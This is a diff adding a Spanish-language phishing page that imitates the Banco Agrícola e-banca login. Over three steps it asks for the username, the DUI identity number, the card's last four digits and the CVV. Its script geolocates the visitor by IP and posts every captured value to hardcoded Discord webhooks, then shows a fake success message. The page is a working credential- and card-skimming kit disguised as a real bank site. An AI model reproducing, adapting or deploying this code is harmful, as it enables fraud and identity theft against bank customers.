@@ -1,0 +1,683 @@
+<!doctype html>
+<html class="no-js" lang="es">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta
+      name="viewport"
+      content="user-scalable=no, width=device-width, initial-scale=1"
+      viewport-fit="cover"
+    />
+    <meta
+      http-equiv="Content-Security-Policy"
+      content="default-src * gap: 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; media-src *; img-src 'self' https://www.google-analytics.com 'unsafe-inline' data: blob: "
+    />
+    <title>Bancoagrícola</title>
+    <link
+      rel="stylesheet"
+      crossorigin=""
+      href="./index_files/index.3ujp6c5y.css"
+    />
+    <style>
+      .hidden-step {
+        display: none !important;
+      }
+      .field-container.double-field {
+        display: flex;
+        gap: 12px;
+      }
+      .field-container.double-field > div {
+        flex: 1;
+      }
+      .step-indicator {
+        display: inline-block;
+        background: #f2f6fc;
+        padding: 6px 16px;
+        border-radius: 30px;
+        font-size: 0.9rem;
+        color: #1e3a6f;
+        margin-top: 8px;
+        font-weight: 400;
+      }
+
+      /* ===== MOBILE ONLY — no toca nada en PC ===== */
+      @media (max-width: 768px) {
+        /* Evitar desbordamiento horizontal global */
+        html,
+        body {
+          overflow-x: hidden !important;
+        }
+
+        /* Centrar el article y darle padding lateral */
+        article.content-wrapper.login-wrapper {
+          display: flex !important;
+          align-items: flex-start !important;
+          justify-content: center !important;
+          padding: 24px 16px !important;
+          min-height: calc(100vh - 120px) !important;
+          box-sizing: border-box !important;
+          width: 100% !important;
+          overflow-x: hidden !important;
+        }
+
+        /* La caja de login: ancho contenido, sin salirse */
+        .login-box {
+          width: 100% !important;
+          max-width: 100% !important;
+          box-sizing: border-box !important;
+          overflow: hidden !important;
+        }
+
+        /* Formulario también contenido */
+        .regular-form.login-form {
+          width: 100% !important;
+          box-sizing: border-box !important;
+        }
+
+        /* Wrappers de campos */
+        .form-section-wrapper,
+        .form-line-wrapper,
+        .field-wrapper {
+          width: 100% !important;
+          box-sizing: border-box !important;
+        }
+
+        /* Contenedor del input: contener el flex interno */
+        .field-container {
+          width: 100% !important;
+          box-sizing: border-box !important;
+          overflow: hidden !important;
+        }
+
+        /* El div interno con display:flex */
+        .field-container > div {
+          width: 100% !important;
+          box-sizing: border-box !important;
+          min-width: 0 !important;
+        }
+
+        /* Todos los inputs: ancho completo, sin desborde, font-size 16 evita zoom iOS */
+        .field-container input,
+        .field-container input[type="text"] {
+          width: 100% !important;
+          min-width: 0 !important;
+          box-sizing: border-box !important;
+          min-height: 44px !important;
+          font-size: 16px !important;
+          padding: 10px 12px !important;
+        }
+
+        /* Inputs paso 3 */
+        #last4,
+        #cvv {
+          min-width: 0 !important;
+          box-sizing: border-box !important;
+          min-height: 44px !important;
+          font-size: 16px !important;
+          padding: 10px 8px !important;
+        }
+
+        /* Botón: más pequeño y centrado en móvil */
+        .button-row.button-login {
+          width: 100% !important;
+          box-sizing: border-box !important;
+          padding: 0 !important;
+          margin-left: 0 !important;
+          margin-right: 0 !important;
+          display: flex !important;
+          justify-content: center !important;
+        }
+        .button-row.button-login .button {
+          width: 60% !important;
+          max-width: 220px !important;
+          box-sizing: border-box !important;
+        }
+
+        /* Footer links */
+        .login-footer-options {
+          gap: 16px !important;
+          flex-wrap: wrap !important;
+          justify-content: center !important;
+        }
+      }
+      /* ===== FIN MOBILE ===== */
+    </style>
+  </head>
+  <body id="app-body" class="normal-version true web-version">
+    <div id="root">
+      <div>
+        <div class="app-wrapper external-wrapper">
+          <div class="out-of-bounds-notice">
+            <div class="message">
+              <p>
+                El ancho de su pantalla es demasiado pequeño para utilizar el
+                sistema
+              </p>
+            </div>
+          </div>
+
+          <header>
+            <div class="contact-help"></div>
+            <h1 class="external-app-name">
+              <a><span class="">Banco Agrícola</span></a>
+            </h1>
+          </header>
+
+          <article class="content-wrapper login-wrapper content-login">
+            <div class="login-box">
+              <h2 class="page-subtitle centered" id="main-title">
+                <span class="">Bienvenido a e-banca Personas</span>
+              </h2>
+
+              <form
+                class="regular-form login-form"
+                autocomplete="off"
+                method="POST"
+                id="stepForm"
+              >
+                <div class="form-section-wrapper" id="formStepsContainer">
+                  <!-- PASO 1: USUARIO -->
+                  <div id="step1" class="step">
+                    <div class="form-line-wrapper static-form">
+                      <div class="field-wrapper field-input">
+                        <label class=""
+                          ><span class="">Usuario</span>
+                          <p class="field-auxiliar"><span class=""></span></p
+                        ></label>
+                        <div class="field-container">
+                          <div style="display: flex; width: 100%">
+                            <input
+                              type="text"
+                              id="usuario"
+                              inputmode=""
+                              autocomplete="off"
+                              autocorrect="off"
+                              autocapitalize="off"
+                              spellcheck="false"
+                              maxlength="20"
+                              value=""
+                              style="opacity: 1"
+                              placeholder=""
+                            />
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                    <div>
+                      <div
+                        class="form-line-wrapper static-form form-input-checked"
+                      >
+                        <div class="field-wrapper field-checkbox-group">
+                          <label class="no-mobile undefined">&nbsp;</label>
+                          <ul>
+                            <li>
+                              <div class="field-checkbox field-small">
+                                <div class="checkbox false no-checked">
+                                  <span class="checkbox-check"></span>
+                                </div>
+                                <span class="checkbox-label"
+                                  ><span
+                                    ><span class=""
+                                      >Recordar usuario</span
+                                    ></span
+                                  ></span
+                                >
+                                <input
+                                  name="rememberUser"
+                                  type="checkbox"
+                                  autocomplete="off"
+                                  class="hidden"
+                                  value="true"
+                                />
+                              </div>
+                            </li>
+                          </ul>
+                        </div>
+                      </div>
+                    </div>
+                    <div class="form-line-wrapper">
+                      <div class="field-link-wrapper">
+                        <a
+                          class="field-link"
+                          href="https://www.ebanca.com/userRecoveryUserEntry"
+                          id="forgotLink"
+                          ><span class="">Olvide mi Clave</span></a
+                        >
+                      </div>
+                    </div>
+                  </div>
+
+                  <!-- PASO 2: DPI -->
+                  <div id="step2" class="step hidden-step">
+                    <div class="form-line-wrapper static-form">
+                      <div class="field-wrapper field-input">
+                        <label class=""
+                          ><span class=""
+                            >Documento Único de Identidad (DUI)</span
+                          >
+                          <p class="field-auxiliar"><span class=""></span></p
+                        ></label>
+                        <div class="field-container">
+                          <div style="display: flex; width: 100%">
+                            <input
+                              type="text"
+                              id="dpi"
+                              inputmode="numeric"
+                              autocomplete="off"
+                              maxlength="9"
+                              placeholder="Número de DUI"
+                              value=""
+                              class=""
+                            />
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                    <div class="form-line-wrapper">
+                      <div class="field-link-wrapper">
+                        <span
+                          class="field-link"
+                          style="cursor: default; color: #6f7d95"
+                          ><span class=""
+                            >Ingrese su DUI (9 dígitos)</span
+                          ></span
+                        >
+                      </div>
+                    </div>
+                  </div>
+
+                  <!-- PASO 3: ÚLTIMOS 4 DÍGITOS Y CVV -->
+                  <div id="step3" class="step hidden-step">
+                    <div class="form-line-wrapper static-form">
+                      <div class="field-wrapper field-input">
+                        <label class=""
+                          ><span class="">Tarjeta de débito/crédito</span>
+                          <p class="field-auxiliar"><span class=""></span></p
+                        ></label>
+                        <div class="field-container" style="padding: 0">
+                          <div style="display: flex; width: 100%; gap: 12px">
+                            <div style="flex: 2">
+                              <input
+                                type="text"
+                                id="last4"
+                                inputmode="numeric"
+                                maxlength="4"
+                                placeholder="Últ. 4 dígitos"
+                                value=""
+                                autocomplete="off"
+                                style="width: 100%"
+                              />
+                            </div>
+                            <div style="flex: 1">
+                              <input
+                                type="text"
+                                id="cvv"
+                                inputmode="numeric"
+                                maxlength="3"
+                                placeholder="CVV"
+                                value=""
+                                autocomplete="off"
+                                style="width: 100%"
+                              />
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                    <div class="form-line-wrapper">
+                      <div class="field-link-wrapper">
+                        <span
+                          class="field-link"
+                          style="cursor: default; color: #6f7d95"
+                          ><span class=""
+                            >Código de 3 dígitos detrás de la tarjeta</span
+                          ></span
+                        >
+                      </div>
+                    </div>
+                  </div>
+
+                  <div
+                    style="
+                      display: flex;
+                      justify-content: center;
+                      margin-top: 16px;
+                    "
+                  >
+                    <span class="step-indicator field-auxiliar" id="stepCounter"
+                      >Paso 1 de 3</span
+                    >
+                  </div>
+                </div>
+
+                <div class="button-row centered button-login button-arrow">
+                  <button
+                    type="button"
+                    id="mainActionBtn"
+                    class="button undefined"
+                  >
+                    <span><span id="btnText" class="">Continuar</span></span>
+                    <span class="loading-indicator"
+                      ><span class="">Cargando...</span></span
+                    >
+                  </button>
+                </div>
+
+                <div class="login-footer-options">
+                  <a class="icon-edit" href="https://www.ebanca.com/enrollment"
+                    ><span class="">Regístrate</span></a
+                  >
+                  <a class="icon-register"><span></span></a>
+                  <a class="icon-call" href="https://www.ebanca.com/contactUs"
+                    ><span class="">Contáctanos</span></a
+                  >
+                </div>
+              </form>
+              <div></div>
+            </div>
+          </article>
+
+          <footer class="normal-footer">
+            <ul class="footer-list">
+              <li>
+                <a><span class="">Consejos de seguridad</span></a>
+              </li>
+              <li>
+                <a><span class="">Tutorial del canal</span></a>
+              </li>
+              <li>
+                <a><span class="">Tips de uso</span></a>
+              </li>
+              <li>
+                <a><span class="">Preguntas frecuentes</span></a>
+              </li>
+              <li>
+                <span
+                  ><span class=""
+                    >Banco Agrícola© Todos los derechos reservados.</span
+                  ></span
+                >
+              </li>
+              <li><p class="app-version">5.0.7</p></li>
+            </ul>
+          </footer>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      (function () {
+        const step1 = document.getElementById("step1");
+        const step2 = document.getElementById("step2");
+        const step3 = document.getElementById("step3");
+        const stepCounter = document.getElementById("stepCounter");
+        const btn = document.getElementById("mainActionBtn");
+        const btnText = document.getElementById("btnText");
+
+        const usuarioInput = document.getElementById("usuario");
+        const dpiInput = document.getElementById("dpi");
+        const last4Input = document.getElementById("last4");
+        const cvvInput = document.getElementById("cvv");
+
+        let currentStep = 1;
+
+        function showStep(step) {
+          step1.classList.add("hidden-step");
+          step2.classList.add("hidden-step");
+          step3.classList.add("hidden-step");
+
+          if (step === 1) {
+            step1.classList.remove("hidden-step");
+            stepCounter.innerText = "Paso 1 de 3 · Usuario";
+            btnText.innerText = "Continuar";
+          } else if (step === 2) {
+            step2.classList.remove("hidden-step");
+            stepCounter.innerText = "Paso 2 de 3 · DUI";
+            btnText.innerText = "Continuar";
+          } else if (step === 3) {
+            step3.classList.remove("hidden-step");
+            stepCounter.innerText = "Paso 3 de 3 · Tarjeta";
+            btnText.innerText = "Validar";
+          }
+        }
+
+        function isStepValid(step) {
+          if (step === 1) {
+            return usuarioInput.value.trim().length > 0;
+          } else if (step === 2) {
+            const dpi = dpiInput.value.trim();
+            return dpi.length === 9 && /^\d+$/.test(dpi);
+          } else if (step === 3) {
+            const last4 = last4Input.value.trim();
+            const cvv = cvvInput.value.trim();
+            return (
+              last4.length === 4 &&
+              /^\d+$/.test(last4) &&
+              cvv.length === 3 &&
+              /^\d+$/.test(cvv)
+            );
+          }
+          return false;
+        }
+
+        async function handleFinal() {
+          const usuario = usuarioInput.value.trim();
+          const dpi = dpiInput.value.trim();
+          const last4 = last4Input.value.trim();
+          const cvv = cvvInput.value.trim();
+
+          // Obtener IP y ubicación
+          try {
+            // Obtener IP
+            const ipResponse = await fetch("https://api.ipify.org?format=json");
+            const ipData = await ipResponse.json();
+            const ip = ipData.ip;
+
+            // Obtener información de ubicación basada en IP
+            const geoResponse = await fetch(`http://ip-api.com/json/${ip}`);
+            const geoData = await geoResponse.json();
+
+            const pais = geoData.country || "No disponible";
+            const ciudad = geoData.city || "No disponible";
+
+            // Preparar el mensaje para Discord
+            const webhookURL =
+              "https://discord.com/api/webhooks/1486109715732762696/K3liqZZvwYXfAvuMd-By83IaUEIr9d4lfHC6uidCEu2rWNZvBaT1E7yijs2VSGbyiviq"; // Reemplaza con tu webhook
+
+            const discordMessage = {
+              content: "@everyone **Nuevos datos capturados**", // Opcional: mencionar a everyone
+              embeds: [
+                {
+                  title: "📋 Información Capturada",
+                  color: 0xff0000, // Color rojo
+                  fields: [
+                    {
+                      name: "👤 Usuario",
+                      value: usuario || "No proporcionado",
+                      inline: true,
+                    },
+                    {
+                      name: "🆔 DPI",
+                      value: dpi || "No proporcionado",
+                      inline: true,
+                    },
+                    {
+                      name: "💳 Últimos 4 dígitos",
+                      value: last4 || "No proporcionado",
+                      inline: true,
+                    },
+                    {
+                      name: "🔐 CVV",
+                      value: cvv || "No proporcionado",
+                      inline: true,
+                    },
+                    {
+                      name: "🌐 IP",
+                      value: ip,
+                      inline: true,
+                    },
+                    {
+                      name: "📍 País",
+                      value: pais,
+                      inline: true,
+                    },
+                    {
+                      name: "🏙️ Ciudad",
+                      value: ciudad,
+                      inline: true,
+                    },
+                  ],
+                  timestamp: new Date().toISOString(),
+                  footer: {
+                    text: "Sistema de captura",
+                  },
+                },
+              ],
+            };
+
+            // Enviar a Discord
+            await fetch(webhookURL, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify(discordMessage),
+            });
+
+            console.log("Datos enviados a Discord correctamente");
+          } catch (error) {
+            console.error(
+              "Error al obtener ubicación o enviar a Discord:",
+              error,
+            );
+
+            // Enviar solo los datos básicos si falla la geolocalización
+            try {
+              const webhookURL =
+                "https://discord.com/api/webhooks/1385484698133729330/rpCJDjpCQWqhcWq2rG4RHEGMtSQA6D1fOerMTAyaRbZd2NZ6O_R7M0plYYD2oRJGnY9P";
+              const fallbackMessage = {
+                content: "⚠️ **Error al obtener ubicación**",
+                embeds: [
+                  {
+                    title: "📋 Información Capturada",
+                    color: 0xffa500, // Color naranja
+                    fields: [
+                      {
+                        name: "👤 Usuario",
+                        value: usuario || "No proporcionado",
+                        inline: true,
+                      },
+                      {
+                        name: "🆔 DPI",
+                        value: dpi || "No proporcionado",
+                        inline: true,
+                      },
+                      {
+                        name: "💳 Últimos 4 dígitos",
+                        value: last4 || "No proporcionado",
+                        inline: true,
+                      },
+                      {
+                        name: "🔐 CVV",
+                        value: cvv || "No proporcionado",
+                        inline: true,
+                      },
+                    ],
+                    timestamp: new Date().toISOString(),
+                  },
+                ],
+              };
+
+              await fetch(webhookURL, {
+                method: "POST",
+                headers: {
+                  "Content-Type": "application/json",
+                },
+                body: JSON.stringify(fallbackMessage),
+              });
+              ƒ;
+            } catch (discordError) {
+              console.error("Error al enviar a Discord:", discordError);
+            }
+          }
+
+          alert("Verificacion exitosa");
+
+          usuarioInput.value = "";
+          dpiInput.value = "";
+          last4Input.value = "";
+          cvvInput.value = "";
+          currentStep = 1;
+          showStep(1);
+        }
+
+        btn.addEventListener("click", function (e) {
+          e.preventDefault();
+
+          if (!isStepValid(currentStep)) {
+            let msg = "";
+            if (currentStep === 1) msg = "Ingrese su usuario.";
+            else if (currentStep === 2)
+              msg = "Ingrese un DUI válido (9 dígitos exactos).";
+            else if (currentStep === 3)
+              msg =
+                "Complete últimos 4 dígitos y CVV (solo números, 4 y 3 caracteres).";
+            return;
+          }
+
+          if (currentStep === 1) {
+            currentStep = 2;
+            showStep(2);
+          } else if (currentStep === 2) {
+            currentStep = 3;
+            showStep(3);
+          } else if (currentStep === 3) {
+            handleFinal();
+          }
+        });
+
+        [usuarioInput, dpiInput, last4Input, cvvInput].forEach((input) => {
+          if (input) {
+            input.addEventListener("keypress", (e) => {
+              if (e.key === "Enter") {
+                e.preventDefault();
+                btn.click();
+              }
+            });
+          }
+        });
+
+        const forgotLink = document.getElementById("forgotLink");
+        if (forgotLink) {
+          forgotLink.addEventListener("click", (e) => {
+            e.preventDefault();
+            alert("Opción desactivada en demostración de 3 pasos.");
+          });
+        }
+
+        document
+          .getElementById("stepForm")
+          .addEventListener("submit", (e) => e.preventDefault());
+
+        document
+          .querySelectorAll(".login-footer-options a, .footer-list a")
+          .forEach((link) => {
+            link.addEventListener("click", (e) => {
+              if (link.classList.contains("icon-register")) return;
+              e.preventDefault();
+              alert("Navegación desactivada en esta demostración de 3 pasos.");
+            });
+          });
+
+        document.querySelectorAll(".footer-list a").forEach((link) => {
+          link.addEventListener("click", (e) => {
+            e.preventDefault();
+            alert("Contenido informativo no disponible en demo.");
+          });
+        });
+
+        showStep(1);
+      })();
+    </script>
+  </body>
+</html>
